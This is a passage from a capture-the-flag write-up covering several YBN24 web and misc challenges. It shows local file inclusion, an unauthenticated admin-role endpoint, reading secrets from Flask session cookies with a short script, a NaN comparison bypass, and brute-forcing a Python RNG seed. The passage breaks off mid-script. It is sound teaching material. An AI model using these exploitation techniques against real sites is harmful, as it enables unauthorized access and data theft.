<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">_0x2c43cf</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">_0x1d2082</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">_0x1dc557</span><span class="p">();</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">_0x3b9633</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x3ca409</span><span class="p">(</span><span class="nx">_0x1d2082</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;IAMINSOMUCHPAIN&#39;</span><span class="p">);</span>
<span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">_0x3196bc</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&quot;secret&quot;</span><span class="p">);</span>
<span class="w">  </span><span class="nx">_0x3196bc</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x3b9633</span><span class="p">;</span>
<span class="w">  </span><span class="nb">window</span><span class="p">.</span><span class="nx">_0x5cd0b7</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{};</span>
<span class="p">}</span>
</code></pre></div>
The function <code>_0x2c43cf()</code> seems to be responsible for giving us the flag, load the deobfuscated script into the js console and call <code>_0x2c43cf()</code>, giving us the flag
<img alt="Pasted image 20241201111523.png" src="../../assets/Pasted%20image%2020241201111523.png" />
<code>YBN24{I_To1d_y0u_not_T0_Peek!}</code></p>
<h2 id="web-web-web">Web web web<a class="headerlink" href="#web-web-web" title="Permanent link">&para;</a></h2>
<p>Once again through inspect element, we are able to find parts of the flag. This time, the flag seemed to be split up across different files
<img alt="Pasted image 20241201112322.png" src="../../assets/Pasted%20image%2020241201112322.png" />
<img alt="Pasted image 20241201112341.png" src="../../assets/Pasted%20image%2020241201112341.png" />
<img alt="Pasted image 20241201112428.png" src="../../assets/Pasted%20image%2020241201112428.png" />
The last part was slightly trickier. After quite some time searching, I still could not find it and decided to load burp to assist in searching for it.
<img alt="Pasted image 20241202195015.png" src="../../assets/Pasted%20image%2020241202195015.png" />
From burp, only 3 requests contained the phrase <code>part</code>, meaning the last part of the flag was not from the same page.  I decided to poke around at other common endpoints such as <code>/sitemap.xml</code> and <code>robots.txt</code>, ultimately finding the flag from <code>robots.txt</code>
<img alt="Pasted image 20241202195217.png" src="../../assets/Pasted%20image%2020241202195217.png" />
<img alt="Pasted image 20241202195228.png" src="../../assets/Pasted%20image%2020241202195228.png" />
<code>YBN24{th1s_1s_4_c4ll_f0r_h3lp}</code></p>
<h2 id="simple-website">Simple website<a class="headerlink" href="#simple-website" title="Permanent link">&para;</a></h2>
<p>For this challenge, the site seems to display whatever file it finds from the <code>?page=...</code> query parameter.
<img alt="Pasted image 20241202195414.png" src="../../assets/Pasted%20image%2020241202195414.png" />
As such, this is a LFI challenge and I started poking around for possible locations the flag might be. 
<img alt="Pasted image 20241202195617.png" src="../../assets/Pasted%20image%2020241202195617.png" />After trying various paths, I found the flag in <code>/flag.txt</code>
<img alt="Pasted image 20241202195533.png" src="../../assets/Pasted%20image%2020241202195533.png" />
<code>YBN24{lfi_vuln3rable}</code></p>
<blockquote>
<p>I didn't know text files could be directly included but it do be like that I guess</p>
</blockquote>
<h2 id="stationary-threat">Stationary threat<a class="headerlink" href="#stationary-threat" title="Permanent link">&para;</a></h2>
<p>Source code is provided for this challenge. The important parts are
<div class="highlight"><pre><span></span><code><span class="n">roles</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">,</span> <span class="s1">&#39;student&#39;</span><span class="p">,</span><span class="s1">&#39;admin&#39;</span><span class="p">,</span> <span class="s1">&#39;teacher&#39;</span><span class="p">]</span>
<span class="o">...</span>
<span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/api/users/&lt;_id&gt;/roles&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>  
<span class="k">def</span><span class="w"> </span><span class="nf">create_role</span><span class="p">(</span><span class="n">_id</span><span class="p">):</span>  
    <span class="c1"># Our State of the Art Authentication System  </span>
    <span class="k">if</span> <span class="mi">1</span><span class="o">==</span><span class="mi">1</span><span class="p">:</span>  
        <span class="n">_id</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">_id</span><span class="p">)</span>  
        <span class="k">if</span> <span class="n">_id</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="ow">or</span> <span class="n">_id</span> <span class="o">&gt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">roles</span><span class="p">):</span>  
            <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Invalid id&#39;</span><span class="p">}),</span> <span class="mi">400</span>  
        <span class="n">session</span><span class="p">[</span><span class="s1">&#39;role&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">roles</span><span class="p">[</span><span class="n">_id</span><span class="p">]</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Role created successfully&#39;</span><span class="p">})</span>  
    <span class="k">else</span><span class="p">:</span>  
        <span class="k">return</span> <span class="n">jsonify</span><span class="p">({</span><span class="s1">&#39;message&#39;</span><span class="p">:</span> <span class="s1">&#39;Unauthorized&#39;</span><span class="p">}),</span> <span class="mi">401</span>  
    <span class="nd">@app</span><span class="o">.</span><span class="n">route</span><span class="p">(</span><span class="s1">&#39;/nuke&#39;</span><span class="p">)</span>  
<span class="k">def</span><span class="w"> </span><span class="nf">nuke</span><span class="p">():</span>  
    <span class="n">role</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;role&#39;</span><span class="p">,</span><span class="s2">&quot;user&quot;</span><span class="p">)</span>  
    <span class="k">if</span> <span class="n">role</span> <span class="o">==</span> <span class="s1">&#39;admin&#39;</span><span class="p">:</span>  
        <span class="n">flag</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span><span class="s1">&#39;r&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>  
    <span class="k">else</span><span class="p">:</span>  
        <span class="n">flag</span> <span class="o">=</span> <span class="kc">None</span>   
<span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s1">&#39;nuke.html&#39;</span><span class="p">,</span> <span class="n">flag</span><span class="o">=</span><span class="n">flag</span><span class="p">)</span>
</code></pre></div>
* The <code>/nuke</code> endpoint, which requires us to have the <code>admin</code> role retrieved from the session storage.
* The  <code>/api/users/&lt;_id&gt;/roles</code> endpoint, which has no authentication and allows us to submit any role id and have it stored in the session storage. 
Thus, a simple post request of <code>https://stationary-threat-stationary-threat-chall.ybn.sg/api/users/2/roles</code> allows us to obtain the admin role, then <code>/nuke</code>
<code>YBN24{@utHEnT!cA71On?_wha7'S_7h4t?}</code></p>
<h2 id="number-oracle">Number oracle<a class="headerlink" href="#number-oracle" title="Permanent link">&para;</a></h2>
<p>A site where we have to consecutively guess the correct numbers. No source code is provided
<img alt="Pasted image 20241202201153.png" src="../../assets/Pasted%20image%2020241202201153.png" />
Since no source code was provided, I started poking around the page
<img alt="Pasted image 20241202201333.png" src="../../assets/Pasted%20image%2020241202201333.png" />
We can see that there is no script client side and that verification is done by the server.
<img alt="Pasted image 20241202201508.png" src="../../assets/Pasted%20image%2020241202201508.png" />
There is also a session cookie, which when <a href="https://www.kirsle.net/wizards/flask-session.cgi">decoded</a> reveals the next number is actually kept in session storage (which when using flask sessions is viewable, but not editable without the secret key).
<img alt="Pasted image 20241202201702.png" src="../../assets/Pasted%20image%2020241202201702.png" />
Thus, by retrieving the session cookie and decoding it each guess, we can correctly submit the next number. I was lazy to do it by hand 10 times so I made a quick script
<div class="highlight"><pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span><span class="o">,</span><span class="w"> </span><span class="nn">base64</span><span class="o">,</span><span class="w"> </span><span class="nn">json</span>  

<span class="n">endpoint</span> <span class="o">=</span> <span class="s2">&quot;https://number-oracle-number-oracle-chall.ybn.sg/&quot;</span> 
<span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>  

<span class="n">r</span> <span class="o">=</span> <span class="kc">None</span>  
<span class="k">def</span><span class="w"> </span><span class="nf">make_req</span><span class="p">(</span><span class="n">num</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>  
    <span class="k">try</span><span class="p">:</span>  
        <span class="k">global</span> <span class="n">r</span>  
        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;guess&quot;</span><span class="p">:</span> <span class="n">num</span><span class="p">}</span>  
        <span class="n">r</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">endpoint</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>  
        <span class="n">cookies</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;session&quot;</span><span class="p">)</span>  
        <span class="nb">print</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>  
        <span class="n">cookies</span> <span class="o">=</span> <span class="n">cookies</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>  
        <span class="c1"># Add padding if necessary  </span>
        <span class="n">padding_needed</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span> <span class="o">%</span> <span class="mi">4</span>  
        <span class="k">if</span> <span class="n">padding_needed</span><span class="p">:</span>  
            <span class="n">cookies</span> <span class="o">+=</span> <span class="s1">&#39;=&#39;</span> <span class="o">*</span> <span class="p">(</span><span class="mi">4</span> <span class="o">-</span> <span class="n">padding_needed</span><span class="p">)</span>  
        <span class="n">s</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>  
        <span class="n">num</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">s</span><span class="p">)[</span><span class="s2">&quot;next_guess&quot;</span><span class="p">]</span>  
        <span class="nb">print</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>  
        <span class="k">return</span> <span class="n">num</span>  
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  
        <span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
        <span class="nb">print</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="p">)</span>  
        <span class="k">raise</span> <span class="n">e</span>  

<span class="n">num</span> <span class="o">=</span> <span class="mi">0</span>  
<span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>  
<span class="k">while</span> <span class="kc">True</span><span class="p">:</span>  
    <span class="n">i</span><span class="o">+=</span> <span class="mi">1</span>  
    <span class="n">num</span> <span class="o">=</span> <span class="n">make_req</span><span class="p">(</span><span class="n">num</span><span class="p">)</span>  
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Occ:&quot;</span><span class="p">,</span> <span class="n">i</span><span class="p">)</span>  
    <span class="k">if</span> <span class="p">(</span><span class="n">i</span> <span class="o">&gt;</span> <span class="mi">10</span><span class="p">):</span>  
        <span class="k">break</span>  

<span class="nb">print</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>  
<span class="nb">print</span><span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">cookies</span><span class="p">)</span>
</code></pre></div>
<code>YBN24{D0nT_pUT_$3CR3Ts_IN_53S$1ON_coOk1Es_a2650f92c6893e5bb6437}</code></p>
<h2 id="more-kaboommmmm">MORE KABOOMMMMM<a class="headerlink" href="#more-kaboommmmm" title="Permanent link">&para;</a></h2>
<p>Source code is provided for this challenge.
<img alt="Pasted image 20241202202146.png" src="../../assets/Pasted%20image%2020241202202146.png" />
<div class="highlight"><pre><span></span><code><span class="p">...</span>
<span class="nx">router</span><span class="p">.</span><span class="nx">post</span><span class="p">(</span><span class="s1">&#39;/nuke&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">req</span><span class="p">,</span><span class="w"> </span><span class="nx">res</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
<span class="w">    </span><span class="c1">// Call the backend script with the provided data  </span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">;</span><span class="w">  </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">baba</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="o">!</span><span class="nx">data</span><span class="p">.</span><span class="nx">nukes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Invalid data&#39;</span><span class="w"> </span><span class="p">});</span><span class="w">  </span>
<span class="w">        </span><span class="k">return</span><span class="w">  </span>
<span class="w">    </span><span class="p">}</span><span class="w">  </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">data</span><span class="p">.</span><span class="nx">baba</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="mf">2</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">data</span><span class="p">.</span><span class="nx">nukes</span><span class="p">.</span><span class="nx">some</span><span class="p">(</span><span class="nx">nuke</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">nuke</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">!==</span><span class="w"> </span><span class="mf">2</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Invalid data&#39;</span><span class="w"> </span><span class="p">});</span><span class="w">  </span>
<span class="w">        </span><span class="k">return</span><span class="w">  </span>
<span class="w">    </span><span class="p">}</span><span class="w">  </span>


<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="p">{</span><span class="nx">baba</span><span class="p">,</span><span class="nx">nukes</span><span class="p">}</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">data</span><span class="p">;</span><span class="w">  </span>
<span class="w">    </span><span class="nx">baba</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">baba</span><span class="p">[</span><span class="mf">0</span><span class="p">])</span><span class="w">  </span>
<span class="w">    </span><span class="nx">baba</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">baba</span><span class="p">[</span><span class="mf">1</span><span class="p">])</span><span class="w">  </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">baba</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">baba</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">20</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">baba</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">baba</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">20</span><span class="p">){</span><span class="w">  </span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Data Out Of Range&#39;</span><span class="w"> </span><span class="p">});</span><span class="w">  </span>
<span class="w">        </span><span class="k">return</span><span class="w">  </span>
<span class="w">    </span><span class="p">}</span><span class="w">  </span>
<span class="w">    </span><span class="c1">// add an extra nuke at baba&#39;s exact position  </span>
<span class="w">    </span><span class="nx">nukes</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">baba</span><span class="p">)</span><span class="w">  </span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">number_of_nukes_hit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="w">  </span>

<span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">nuke</span><span class="w"> </span><span class="k">of</span><span class="w"> </span><span class="nx">nukes</span><span class="p">){</span><span class="w">  </span>
<span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="p">[</span><span class="nx">x</span><span class="p">,</span><span class="nx">y</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">nuke</span><span class="p">;</span><span class="w">  </span>
<span class="w">        </span><span class="nx">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">x</span><span class="p">)</span><span class="w">  </span>
<span class="w">        </span><span class="nx">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">parseInt</span><span class="p">(</span><span class="nx">y</span><span class="p">)</span><span class="w">  </span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">x</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">x</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">20</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">0</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="nx">y</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">20</span><span class="p">){</span><span class="w">  </span>
<span class="w">            </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">400</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="w"> </span><span class="nx">error</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Data Out Of Range&#39;</span><span class="w"> </span><span class="p">});</span><span class="w">  </span>
<span class="w">            </span><span class="k">return</span><span class="w">  </span>
<span class="w">        </span><span class="p">}</span><span class="w">  </span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">baba</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="o">-</span><span class="nx">x</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">5</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">Math</span><span class="p">.</span><span class="nx">abs</span><span class="p">(</span><span class="nx">baba</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="o">-</span><span class="nx">y</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mf">5</span><span class="p">){</span><span class="w">  </span>
<span class="w">            </span><span class="nx">number_of_nukes_hit</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mf">1</span><span class="w">  </span>
<span class="w">        </span><span class="p">}</span><span class="w">  </span>
<span class="w">    </span><span class="p">}</span><span class="w">  </span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">number_of_nukes_hit</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mf">1</span><span class="p">){</span><span class="w">  </span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="nx">result</span><span class="o">:</span><span class="w"> </span><span class="sb">`Good Job Comarade. Baba has been successfully nuked! He has suffered a total of </span><span class="si">${</span><span class="nx">number_of_nukes_hit</span><span class="si">}</span><span class="sb"> damage.`</span><span class="p">});</span><span class="w">  </span>
<span class="w">    </span><span class="p">}</span><span class="w">  </span>
<span class="w">    </span><span class="k">else</span><span class="w"> </span><span class="p">{</span><span class="w">  </span>
<span class="w">        </span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span><span class="p">(</span><span class="mf">200</span><span class="p">).</span><span class="nx">json</span><span class="p">({</span><span class="nx">result</span><span class="o">:</span><span class="w"> </span><span class="sb">`Baba is safe. You have failed the motherland. </span><span class="si">${</span><span class="nx">flag</span><span class="si">}</span><span class="sb"> `</span><span class="p">});</span><span class="w">  </span>
<span class="w">    </span><span class="p">}</span><span class="w">  </span>
<span class="p">});</span>
</code></pre></div>
Our goal for this challenge is to <em>not</em> get Baba nuked, despite there always being a free nuke added at Baba's position. The vulnerability comes from this line
<div class="highlight"><pre><span></span><code><span class="w">    </span><span class="nx">baba</span><span class="p">[</span><span class="mf">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">baba</span><span class="p">[</span><span class="mf">0</span><span class="p">])</span><span class="w">  </span>
<span class="w">    </span><span class="nx">baba</span><span class="p">[</span><span class="mf">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">Number</span><span class="p">(</span><span class="nx">baba</span><span class="p">[</span><span class="mf">1</span><span class="p">])</span><span class="w">  </span>
</code></pre></div>
, which directly throws the text we provide into a <code>Number</code> constructor. As per the <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Number#:~:text=returns%20NaN">mdn docs</a>, a number that can't be parsed will return <code>NaN</code>, which could be used to bypass checks. In this case, <code>Nan &gt; ...</code> and <code>Nan &lt; ...</code> both return false, thus the position is considered within range and the baba position check succeeds. <code>Math.abs(baba[0]-x)</code> will still return <code>NaN</code>, which also causes the range checks to fail and no nukes are counted. 
<img alt="Pasted image 20241202203101.png" src="../../assets/Pasted%20image%2020241202203101.png" />
<code>YBN24{I_10VE_J4vaScR1P7}</code></p>
<h2 id="cool-math-games">Cool math games<a class="headerlink" href="#cool-math-games" title="Permanent link">&para;</a></h2>
<p>Source code is provided. Similar to number oracle, we are supposed to guess the next number except this time without the server providing it.
main.py:
<div class="highlight"><pre><span></span><code><span class="n">RAND_SEED</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;seed&quot;</span><span class="p">)</span>  
<span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">RAND_SEED</span><span class="p">))</span>  

<span class="k">def</span><span class="w"> </span><span class="nf">generate_random_string</span><span class="p">():</span>  
    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">([</span><span class="n">random</span><span class="o">.</span><span class="n">choice</span><span class="p">(</span><span class="n">ascii_lowercase</span> <span class="o">+</span> <span class="n">ascii_uppercase</span> <span class="o">+</span> <span class="n">digits</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>  

<span class="n">rounds</span> <span class="o">=</span> <span class="mi">160</span>  
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Welcome to my game! Your user ID is </span><span class="se">\&quot;</span><span class="si">{</span><span class="n">generate_random_string</span><span class="p">()</span><span class="si">}</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="p">)</span>  
<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Complete all the rounds of this game, and you win the flag! Good luck!&quot;</span><span class="p">)</span>  
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">rounds</span><span class="p">):</span>  
    <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">,</span> <span class="sa">f</span><span class="s2">&quot;Round </span><span class="si">{</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">,</span> <span class="s1">&#39;*&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>  
    <span class="n">answer_string</span> <span class="o">=</span> <span class="n">generate_random_string</span><span class="p">()</span>  
    <span class="n">guess</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="nb">input</span><span class="p">(</span><span class="s2">&quot;Enter the string: &quot;</span><span class="p">))</span>  
    <span class="k">if</span> <span class="n">guess</span> <span class="o">!=</span> <span class="n">answer_string</span><span class="p">:</span>  
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Sorry, but your response was wrong. Out!&quot;</span><span class="p">)</span>  
        <span class="n">exit</span><span class="p">()</span>  
    <span class="nb">print</span><span class="p">()</span>  
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Congratulations! Here is your flag: </span><span class="si">{</span><span class="n">os</span><span class="o">.</span><span class="n">getenv</span><span class="p">(</span><span class="s1">&#39;FLAG&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre></div>
startup.sh:
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash  </span>

sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>socat<span class="w"> </span>-y<span class="w">  </span>
sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>python3<span class="w"> </span>-y<span class="w">  </span>

<span class="nv">seed</span><span class="o">=</span><span class="nv">$RANDOM</span><span class="w">  </span>
<span class="nb">export</span><span class="w"> </span>seed<span class="w"> </span><span class="c1"># Credits to Jabriel for the idea  </span>
<span class="nb">export</span><span class="w"> </span><span class="nv">FLAG</span><span class="o">=</span><span class="s2">&quot;YBN24{this_is_a_fake_flag}&quot;</span><span class="w">  </span>

pip<span class="w"> </span>install<span class="w"> </span>-r<span class="w"> </span>requirements.txt<span class="w">  </span>
socat<span class="w"> </span>-dd<span class="w"> </span>TCP-LISTEN:1337,fork,reuseaddr<span class="w"> </span>EXEC:<span class="s2">&quot;python server.py&quot;</span>
</code></pre></div>
From the startup script, we can see that the seed is set before the servers run, meaning that the seed is fixed across connections.  Checking what <code>$RANDOM</code> is, we find it is a random number between <a href="https://stackoverflow.com/a/1194890">0 and 32767</a>. When we first connect, we are given a random user id based on the seed, meaning we can brute force all 32768 seeds until one correctly generates the same user id.
<div class="highlight"><pre><span></span><code><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32768</span><span class="p">):</span>  
    <span class="n">random</span><span class="o">.</span><span class="n">seed</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>  
    <span class="k">if</span> <span class="n">generate_random_string</span><span class="p">()</span> <span class="o">==</span> <span class="s2">&quot;QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg&quot;</span><span class="p">:</span>  <span class="c1"># Our user id</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</code></pre></div>
From there, we can seed our generator to match the rng used by the server, giving us the exact same randomness as generated by the server.
<div class="highlight"><pre><span></span><code><span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&quot;tcp.ybn.sg&quot;</span><span class="p">,</span> <span class="mi">28480</span><span class="p">)</span>  
<span class="nb">id</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>  
<span class="k">if</span> <span class="s2">&quot;QfcBV6xiFUrhKL92jxRDP8zudB7XnBcg&quot;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="nb">id</span><span class="p">:</span>  
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Wrong remote&quot;</span><span class="p">)</span>  
